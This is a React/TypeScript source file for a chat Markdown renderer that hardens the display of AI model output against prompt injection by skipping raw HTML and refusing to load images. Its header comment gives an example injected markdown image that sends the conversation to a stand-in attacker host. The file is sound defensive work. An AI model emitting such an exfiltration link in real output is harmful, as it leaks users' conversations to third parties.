import Markdown from 'react-markdown';
import type { Components } from 'react-markdown';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { atomDark } from 'react-syntax-highlighter/dist/cjs/styles/prism';

/**
 * Renders model output as Markdown. Model output is untrusted (prompt injection), so:
 * - raw HTML is never rendered (`skipHtml`; there is no rehype-raw),
 * - unsafe URL schemes (e.g. `javascript:`) are removed by react-markdown's default transform,
 * - images are NOT loaded: an injected `![](https://attacker/?q=<conversation>)` would leak
 *   data to a third party the moment it renders (our CSP allows any https image). Alt text is
 *   shown instead,
 * - links open in a new tab without referrer or opener access.
 */
const components: Components = {
  // Code blocks render their own container below; avoid a <pre> wrapping a <pre>/<div>.
  pre: ({ children }) => <>{children}</>,
  code({ className, children }) {
    const code = String(children).replace(/\n$/, '');
    const language = /language-([\w-]+)/.exec(className ?? '')?.[1];

    if (language) {
      return (
        <SyntaxHighlighter
          style={atomDark}
          language={language}
          PreTag="div"
          customStyle={{ margin: '0.75rem 0', borderRadius: '0.5rem', fontSize: '0.8rem' }}
        >
          {code}
        </SyntaxHighlighter>
      );
    }

    if (code.includes('\n')) {
      return (
        <pre className="my-3 overflow-x-auto rounded-lg bg-gray-900 p-3 text-xs text-gray-200">
          <code>{code}</code>
        </pre>
      );
    }

    return (
      <code className="rounded bg-gray-900 px-1 py-0.5 text-[0.8em] text-[#64ffda]">{code}</code>
    );
  },
  a: ({ href, children }) => (
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer nofollow"
      className="text-[#64ffda] underline underline-offset-2"
    >
      {children}
    </a>
  ),
  img: ({ alt }) => <span className="text-gray-400 italic">[image: {alt || 'not shown'}]</span>,
  p: ({ children }) => <p className="my-2 first:mt-0 last:mb-0">{children}</p>,
  ul: ({ children }) => <ul className="my-2 list-disc space-y-1 pl-5">{children}</ul>,
  ol: ({ children }) => <ol className="my-2 list-decimal space-y-1 pl-5">{children}</ol>,
  h1: ({ children }) => <h3 className="mt-3 mb-2 text-base font-semibold">{children}</h3>,
  h2: ({ children }) => <h3 className="mt-3 mb-2 text-base font-semibold">{children}</h3>,
  h3: ({ children }) => <h4 className="mt-3 mb-2 font-semibold">{children}</h4>,
  blockquote: ({ children }) => (
    <blockquote className="my-2 border-l-2 border-[#64ffda]/40 pl-3 text-gray-400">
      {children}
    </blockquote>
  ),
};

export function ChatMarkdown({ text }: { text: string }) {
  return (
    <Markdown skipHtml components={components}>
      {text}
    </Markdown>
  );
}
